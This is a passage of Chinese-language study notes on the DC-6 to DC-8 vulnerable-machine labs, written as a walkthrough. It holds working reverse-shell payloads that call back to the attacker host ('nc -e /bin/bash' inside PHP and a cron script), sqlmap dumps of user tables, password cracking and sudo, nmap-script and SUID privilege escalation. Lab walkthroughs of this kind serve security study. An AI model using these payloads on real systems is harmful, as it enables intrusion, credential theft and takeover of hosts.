<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">很好很好，这次一次就成功，之前那几次应该也是成功了，只是我眼瞎，把connect看作connecting</span><br><span class="line">得到shell后，设置一个交互式的shell，好看</span><br><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/13/wYpu6WCAsxmdet4.png" alt="image-20211213102023830"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">开始后渗透</span><br><span class="line">那么进去之后，我还是懵，因为真的不懂该怎么办。我现在的权限是什么？</span><br><span class="line">sudo -l 	&#x2F;&#x2F;一无所获</span><br><span class="line">cd &#x2F;root	&#x2F;&#x2F;不出意外的被denied</span><br><span class="line">cd &#x2F;home 	&#x2F;&#x2F;做出规律了，这里开始有信息了！</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/13/wtOS9P8WfCyhLAb.png" alt="image-20211213102409275"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">things-to-do.txt下有账号密码！之前不是开了ssh端口吗？</span><br><span class="line">ssh graham@192.168.136.136</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/13/Zsz13KxabOCTewL.png" alt="image-20211213102701688"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">好的，进来了，但是不懂我还是不懂这个权限啊！</span><br><span class="line">sudo -l	&#x2F;&#x2F;发现一个可以.sh文件，在jens可以无密码执行</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/13/CzmBikgsFAXS6n4.png" alt="image-20211213102812824"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">又不会了，看教程</span><br><span class="line">vi backups.sh</span><br><span class="line">！vi进去，关于shell文件，一定要在顶部写 #!&#x2F;bin&#x2F;bash或者#！&#x2F;bin&#x2F;sh声明使用何种脚本解释器，这里是.sh文件，我忘了一开始进去是啥，好像是bash，改了执行，才会生成root.nse脚本</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/13/hw3ocSvIaCr9JH6.png" alt="image-20211213113015711"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">写入的 os.execute(&quot;&#x2F;bin&#x2F;bash&quot;)	&#x2F;&#x2F;os.execute()用于执行命令。</span><br><span class="line">os.execute()使用，例如下面的两者是等价的Lua：os.execute (&quot;pause&quot;) &lt;&#x3D;&#x3D;&gt;c语言：system(&quot;pause&quot;)，可以用于执行shell命令，</span><br><span class="line">&#x2F;bin&#x2F;bash：此脚本使用&#x2F;bin&#x2F;bash解释器执行</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/13/Prq584tGX9p7ZbQ.png" alt="image-20211213113132654"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">开始提权，两步提权，第一步使用jens下的无密码执行脚本，第二步从jens到root，原理未知</span><br><span class="line">第一步：sudo -u jens &#x2F;home&#x2F;jens&#x2F;backups.sh	&#x2F;&#x2F;-u参数以u用户操作文件，这也是sudo -l得知</span><br><span class="line">第二步：sudo nmap -script&#x3D;root.nse</span><br><span class="line">	该命令行以root权限执行</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/13/e8ZgS5yLjnQHr3f.png" alt="image-20211213120915009"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">完成</span><br><span class="line">疑问？</span><br><span class="line">为什么nmap使用脚本os.execute(&quot;&#x2F;bin&#x2F;bash&quot;)就可以获得shell？&#x2F;bin&#x2F;bash不是使用bash来解释shell吗？那为什么执行&#x2F;bin&#x2F;bash就可以得到shell？</span><br><span class="line">初步查阅：</span><br><span class="line">&#x2F;bin&#x2F;bash只可以在root下执行，那么当我使用脚本执行了&#x2F;bin&#x2F;bash，那我是不是就进入了root？有点怪</span><br></pre></td></tr></table></figure>
<p>学到了啥?</p>
<p>对于bash提权有一定了解，对于kali工具使用更加熟练，nmap的使用更加全面；linux命令更加得心应手；对于linux系统的shell模块初步了解；反弹shell更加熟练；linux文件系统中各文件位置的了解（/usr/share/攻击模块exploitdb）</p>
<h2 id="DC-7"><a href="#DC-7" class="headerlink" title="DC-7"></a>DC-7</h2><h3 id="前置知识-6"><a href="#前置知识-6" class="headerlink" title="前置知识"></a>前置知识</h3><p>GPG加密软件的识别：后缀为.gpg</p>
<p>ls命令的高级使用</p>
<p>drush的简单使用</p>
<p>代表权限的字母：x：可执行文件</p>
<p>sed<a href="https://blog.csdn.net/realmeh/article/details/16340453" target="_blank" rel="noopener">命令删除文件中指定数据</a></p>
<p>echo写入</p>
<h3 id="DC-7实操"><a href="#DC-7实操" class="headerlink" title="DC-7实操"></a>DC-7实操</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l	&#x2F;&#x2F;扫描网段内存货ip</span><br><span class="line">得到192.168.136.137</span><br><span class="line">nump -sC 192~	&#x2F;&#x2F;得到开启22与80，-sC：使用默认脚本扫描，蛮不错的，当然也可以使用&quot;-T4 -A&quot;这种全面扫</span><br><span class="line">知道这是drupal，之前有做过，是使用msf来做的（DC-1），这里取个巧，太懒了，只是单纯的searchsploit一下就去看教程了</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/13/6WgavYQdqKhyGDA.png" alt="image-20211213135758187"></p>
<p>卧槽，我果断放弃。看教程，谁知道他直接从footer中搜索@的东西，就出来了username和password，回想到nmap的结果：开启22端口，直接ssh连</p>
<p><img src="https://s2.loli.net/2021/12/13/6cL1Tbt3hEaJWV2.png" alt="image-20211213135909166"></p>
<p>好的，很好，然后我不知道要干啥了;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls	&#x2F;&#x2F;又有一个backups文件但不是脚本。那就去看看mbox</span><br><span class="line">cat mbox	&#x2F;&#x2F;出现这个</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/14/utDTe7zNpscFGAn.png" alt="image-20211214133449547"></p>
<p>可以很直观的发现，这个是在定期执行什么，仔细看一下后，发现这玩意居然是root权限 <code>from root by dc-7 with local (Exim 4.89)</code>，在这里进行操作<code>Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">很好，很好，那就去这个目录下看看到底是什么脚本执行了这个操作</span><br><span class="line">cd &#x2F;opt&#x2F;scripts</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/14/KJW6O3PitYEpjIx.png" alt="image-20211214145025126"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">oh,shit，是你！就是你使用root权限是吧，敢使用root权限，在我DC系列你就必须给我发shell！</span><br><span class="line">那怎么写入nc反弹呢？</span><br><span class="line">我chao，我先看看我又没有权限写呢？</span><br><span class="line">ls -l	&#x2F;&#x2F;很好，跟我dc7user一点关系都没有</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/14/5tRz17J2eQCGcAy.png" alt="image-20211214151341677"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不死心，发现必须死心！（＞人＜；）（＞人＜；）</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/14/hIT7RQ2BdxESPOz.png" alt="image-20211214153500714"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">咋办，我怎么拿到www-data！</span><br><span class="line">继续去网页点点点！log in！</span><br><span class="line">我发现我没有密码！</span><br><span class="line">但是我又发现Drupal可以改密码！但是在哪个目录下改呢？</span><br><span class="line">通过茶查阅！在&#x2F;www&#x2F;html下，我火速cd到，然后搜索drush命令的使用！</span><br><span class="line">cd &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">drush user-password  admin --password&#x3D;&quot;123456&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/14/ziIgtAVhUPOpmLW.png" alt="image-20211214151645156"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">很好很好，那就现在去登录！</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/14/dH2PzmXhJMGZoyf.png" alt="image-20211214151809316"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">那接下来呢？点点点！找写入地方或者找上传文件的地方！</span><br></pre></td></tr></table></figure>
<p>找到一个</p>
<p><img src="https://s2.loli.net/2021/12/14/kJqOc6aZrnVXdxw.png" alt="image-20211214152233021"></p>
<p>找到写入，就写入一句话木马然后拿shell工具连，要么就反弹shell到本机：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">这里我反弹，但是这个页面不具备解释php的功能，需要安装插件</span><br><span class="line">刚好发现有一个 extend 模块</span><br><span class="line">但是却没有php拓展捏，无奈，看了看 教程因为不知道下载什么版本的php</span><br><span class="line">URL：http:&#x2F;&#x2F;drupal.org&#x2F;project&#x2F;php.</span><br><span class="line">URL：https:&#x2F;&#x2F;ftp.drupal.org&#x2F;files&#x2F;projects&#x2F;php-8.x-1.0.tar.gz</span><br><span class="line">直接丢进网址栏即可</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/14/YaGBIoDUxj52Azq.png" alt="image-20211214152550798"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">但是我不行，很奇怪，很难受，迷茫了一阵，但是仔细一想，我好像不太尊重那个Or</span><br><span class="line">到物理机下载好之后，就拖进来加载就ok了，然后需要在extend打开即可（记得点开之后点最下面的install）</span><br><span class="line">然后就好了，可以去界面选择代码使用php解释！</span><br><span class="line">写入精心构造的弹弹弹，有点小忘php</span><br><span class="line">&lt;?php system(&#39;nc -e &#x2F;bin&#x2F;bash 192.168.136.128 666&#39;)?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/14/iPutJrmbHXlRFfD.png" alt="image-20211214152758073"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">点击save</span><br><span class="line">本地虚拟机开启 nc -lvnp 666 监听</span><br><span class="line">然后浏览器访问修改后的界面</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/14/kdpnTub2zD8wU3f.png" alt="image-20211214153009909"></p>
<p>很好很好</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;		&#x2F;&#x2F;交互式shell</span><br><span class="line">cd &#x2F;opt&#x2F;scripts</span><br><span class="line">好了，测试权限！</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/14/7kRYAKLlnXEtJUr.png" alt="image-20211214153654358"></p>
<p>没拒绝！</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">写入反弹语句：</span><br><span class="line">echo &#39;nc -e 192.168.136.128 666&#39;&gt;&gt;&#x2F;opt&#x2F;scripts.backups.sh</span><br><span class="line">cat backups.sh</span><br></pre></td></tr></table></figure>
<p>额emmm其实这里我一开始写错了，后面想用sed命令删除，没有权限；我没测试过这个脚本的执行规则，所以就g了。没监听到(⊙﹏⊙)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">正常来说，开启监听后，等待脚本执行即可，然后就去几个目录看看就看到flag了</span><br></pre></td></tr></table></figure>
<p>哈哈，弹回来了！规则就是都会执行！</p>
<p><img src="https://s2.loli.net/2021/12/14/nughbMYHJRCNKak.png" alt="image-20211214155144077"></p>
<p>学到了啥？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">学到了22端口开启就可以干坏事</span><br><span class="line">学到了drupal的管理员命令</span><br><span class="line">学到了echo写入反弹语句的妙用</span><br><span class="line">学到了进到主机后，一定要养成随手查看权限的好习惯</span><br><span class="line">学到了php写入网页反弹</span><br><span class="line">加深nmap的使用，-T4 -A就很棒，不用再去看其他牛马参数!</span><br><span class="line">最最最主要的是我学会看提示以及看关键信息了</span><br></pre></td></tr></table></figure>
<p>结束</p>
<h2 id="DC-8"><a href="#DC-8" class="headerlink" title="DC-8"></a>DC-8</h2><h3 id="前置知识-7"><a href="#前置知识-7" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h4><p>了解最基础命令，这次已经初步了解，期待下次使用sqlmap</p>
<h4 id="john解密"><a href="#john解密" class="headerlink" title="john解密"></a>john解密</h4><p>john直接调用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john 文档.txt</span><br></pre></td></tr></table></figure>
<h4 id="信息收集的流程"><a href="#信息收集的流程" class="headerlink" title="信息收集的流程"></a>信息收集的流程</h4><p>除了端口扫描，ping检测，cdn检测，子域名检测，网站目录爆破，中间件信息收集，网页记得查看禁了什么robots.txt</p>
<h4 id="nc小小军刀"><a href="#nc小小军刀" class="headerlink" title="nc小小军刀"></a><a href="https://wsgzao.github.io/post/nc/" target="_blank" rel="noopener">nc</a>小小军刀</h4><p>netcat，网络工具，网络上读、写以及重定向数据，由于它能创建任意所需的连接，因此也是一个很好的网络调试工具。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-l 开启监听模式，实现任意 TCP&#x2F;UDP 端口的侦听，nc 可以作为 server 以 TCP 或 UDP 方式侦听指定端口</span><br></pre></td></tr></table></figure>
<h4 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">文件权限基础知识</span><br><span class="line">suid是什么？sgid又是啥？</span><br><span class="line">suid提权是啥？</span><br><span class="line">如何提权？</span><br><span class="line">shell重定向</span><br></pre></td></tr></table></figure>
<h4 id="文件权限基础"><a href="#文件权限基础" class="headerlink" title="文件权限基础"></a><a href="https://www.runoob.com/linux/linux-file-attr-permission.html" target="_blank" rel="noopener">文件权限基础</a></h4><p><img src="https://s2.loli.net/2021/12/14/vdm2aqGVCuc5QKs.png" alt="image-20211214190814554"></p>
<h5 id="SUID和SGID："><a href="#SUID和SGID：" class="headerlink" title="SUID和SGID："></a><a href="https://www.cnblogs.com/sparkdev/p/9651622.html" target="_blank" rel="noopener">SUID和SGID：</a></h5><p>​    </p>
<p><strong>suid</strong>：查看权限，属主权限的x权限变成了s，这就是suid，如图</p>
<p><img src="https://s2.loli.net/2021/12/15/Y8pjdI2TreCFAun.png" alt="image-20211215225933686"></p>
<p>特点是：</p>
<ul>
<li>suid权限仅仅作用于二进制文件</li>
<li>执行者若拥有该二进制文件的x权限，那么执行者具有该文件属主（root或其他）的权限（提权原理）</li>
<li>仅仅只是在执行该文件时具有属主权限</li>
</ul>
<p><strong>sgid</strong>：属组权限的s权限变成了x：</p>
<p><img src="https://s2.loli.net/2021/12/15/71uUfVdvCgQFNpx.png" alt="image-20211215225956141"></p>
<p>看网址！</p>
<h6 id="suid提权-1"><a href="#suid提权-1" class="headerlink" title="suid提权"></a>suid提权</h6><p>将文件设置我suid权限，就可以获得root文件，如果这个文件不属于root就不行啦！</p>
<h6 id="如何提权？"><a href="#如何提权？" class="headerlink" title="如何提权？"></a>如何提权？</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find提权</span><br><span class="line">设置suid权限</span><br><span class="line">通过获得root权限，写后门或者一句话</span><br></pre></td></tr></table></figure>
<p><a href="https://blog.csdn.net/u011630575/article/details/52151995" target="_blank" rel="noopener">&gt; 是shell重定向</a>    </p>
<p><a href="https://blog.csdn.net/weixin_44912169/article/details/105845909?spm=1001.2101.3001.6650.5&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-5.highlightwordscore&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-5.highlightwordscore" target="_blank" rel="noopener">find提权以及常用参数详解</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1348438" target="_blank" rel="noopener">find专门查找参考</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">语法：find [path…] [expression]</span><br><span class="line">path为查找路径，.为当前路径，&#x2F;为根目录</span><br><span class="line">expression即为参数</span><br><span class="line">-name： 按文件名查找文件</span><br><span class="line">-perm： 按照文件权限来查找文件，4000，2000,1000为分别表示SUID,SGID,SBIT，如777为普通文件的最高权限，7000为特殊文件的最高权限</span><br><span class="line">-user： 按照文件属主来查找</span><br><span class="line">-size n： 文件大小是n个单位</span><br><span class="line"></span><br><span class="line">-type：</span><br><span class="line">d：目录</span><br><span class="line">f：文件</span><br><span class="line">c：字符设备文件</span><br><span class="line">b：块设备文件</span><br><span class="line"></span><br><span class="line">-atime n： time表示日期，时间单位是day,查找系统最后n*24小时内曾被存取过的文件或目录</span><br><span class="line">-amin n： 查找系统最后n分钟内曾被存取过的文件或目录</span><br><span class="line">-ctime n: 查找系统中最后n*24小时内曾被改变文件状态(权限、所属组、位置…)的文件或目录</span><br><span class="line">-cmin n: 查找系统中最后N分钟内曾被改变文件状态(权限、所属组、位置…)的文件或目录</span><br><span class="line">-mtime: 查找系统中最后N分钟内曾被更改过的文件或目录</span><br><span class="line">-mmin n: 查找系统中最后n*24小时内曾被更改过的文件或目录</span><br><span class="line">-print： 将匹配的文件输出到标准输出</span><br><span class="line">-exec： find命令对匹配的文件执行该参数所给出的shell命令。相应命令的形式为’command’ &#123; &#125; ;，注意&#123; &#125;和\；之间的空格。</span><br><span class="line"></span><br><span class="line">语法：find [path…] [expression]</span><br><span class="line">path为查找路径，.为当前路径，&#x2F;为根目录</span><br><span class="line">expression即为参数</span><br><span class="line">-name： 按文件名查找文件</span><br><span class="line">-perm： 按照文件权限来查找文件，4000，2000,1000为分别表示SUID,SGID,SBIT，如777为普通文件的最高权限，7000为特殊文件的最高权限</span><br><span class="line">-user： 按照文件属主来查找</span><br><span class="line">-size n： 文件大小是n个单位</span><br><span class="line">-type：</span><br><span class="line">d：目录</span><br><span class="line">f：文件</span><br><span class="line">c：字符设备文件</span><br><span class="line">b：块设备文件</span><br><span class="line">-atime n： time表示日期，时间单位是day,查找系统最后n*24小时内曾被存取过的文件或目录</span><br><span class="line">-amin n： 查找系统最后n分钟内曾被存取过的文件或目录</span><br><span class="line">-ctime n: 查找系统中最后n*24小时内曾被改变文件状态(权限、所属组、位置…)的文件或目录</span><br><span class="line">-cmin n: 查找系统中最后N分钟内曾被改变文件状态(权限、所属组、位置…)的文件或目录</span><br><span class="line">-mtime: 查找系统中最后N分钟内曾被更改过的文件或目录</span><br><span class="line">-mmin n: 查找系统中最后n*24小时内曾被更改过的文件或目录</span><br><span class="line">-print： 将匹配的文件输出到标准输出</span><br><span class="line">-exec： find命令对匹配的文件执行该参数所给出的shell命令。相应命令的形式为’command’ &#123; &#125; ;，注意&#123; &#125;和\；之间的空格。</span><br></pre></td></tr></table></figure>
<h4 id="DC-8实操"><a href="#DC-8实操" class="headerlink" title="DC-8实操"></a>DC-8实操</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line">nmap -T4 -A 192.168.136.132		&#x2F;&#x2F;22又开了。。</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/14/snqFQrVd5Ezgcul.png" alt="image-20211214162042841"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">登录网站，熟悉的Drupal，那这次是什么呢？</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/14/y56TxnJZOgWzepa.png" alt="image-20211214162459803"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">太好了，有机会跑sqlmap了，一直不是很会用</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">测试！</span><br><span class="line">小迪说过首先是随便输入一些字符在参数后面，要是页面回显报错，那就是代入到查询语句了！</span><br></pre></td></tr></table></figure>
<p>测试成功，会代入查询</p>
<p><img src="https://s2.loli.net/2021/12/14/es9k4jEgFLVPvnH.png" alt="image-20211214164716179"></p>
<p>开始进行注入测试：and大法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;1</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/14/bWlx4PhNgUBLmdk.png" alt="image-20211214164748264"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;2</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/14/xnHI9sTWECp6ge5.png" alt="image-20211214164812837"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">脏字符测试： 1&#39;			</span><br><span class="line">注入点！</span><br><span class="line">开始sqlmap！</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.136.132&#x2F;?nid&#x3D;1&quot;			&#x2F;&#x2F;寻找注入点</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.136.132&#x2F;?nid&#x3D;1&quot; --dbs	&#x2F;&#x2F;爆库名:得到d7db</span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.136.132&#x2F;?nid&#x3D;1&quot; -D d7db --tables	&#x2F;&#x2F;爆表：得到</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/14/EjYbFPntHloNXRy.png" alt="image-20211214231434611"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.136.132&#x2F;?nid&#x3D;1&quot; -D d7db -T users --columns</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/14/WY1IE9gudfcvNCA.png" alt="image-20211214231621771"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.136.132&#x2F;?nid&#x3D;1&quot; -D d7db -T users -C login,name,pass -dump		&#x2F;&#x2F;dump说是保存回显消息啥的，再看看，不加又不行</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/14/gp5KZmM9dXuyBVO.png" alt="image-20211214231758817"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">有印象，要用john爆破</span><br><span class="line">保存密码到文档，直接当前目录调用john即可</span><br><span class="line">密码是：turtle</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/14/H6tFAS8751gRdjq.png" alt="image-20211214232331951"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">得到帐号和密码可以，现在需要找到登陆界面，一般来说，robots.txt会有，或者dirb爆破，7kbscan爆破或者ibm都可以</span><br><span class="line">robots.txt得到&#x2F;usr&#x2F;login或者?q&#x3D;xxxx&#x2F;login的我忘记了</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/15/r6NFkxaCdwsX1RH.png" alt="image-20211215170021706"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">进去之后，点点点</span><br><span class="line">其实还是没点出来，直接去看教程了</span><br><span class="line">下图所示</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/15/KjUmZsbo28PLyut.png" alt="image-20211215170228414"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">经典一句话，system()与os.execute()一样的，都是高权限执行命令</span><br><span class="line">写完后，拉到最下面，点击保存，然后回去</span><br><span class="line">nc -lvnp 666	&#x2F;&#x2F;开启监听</span><br><span class="line">然后把contact us界面提交一次，随便写，即可获得shell</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/15/MukNQ2HlaJ4LICK.png" alt="image-20211215171739528"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;  获取交互式shell</span><br><span class="line">没有任何思路，看教程，哦豁，去找了有suid权限的文件，使用find</span><br><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2021/12/15/K13uCxqFHLEbZ57.png" alt="image-20211215172848968"></p>
<p>find知识补充：</p>
<p><code>/</code>代表从根目录查找</p>
<p><code>-user</code> 寻找属主是root权限的文件</p>
<p><code>-perm 4000</code>符合权限：suid    4000 权限字符s(S),用户位置上的x位上设置。</p>
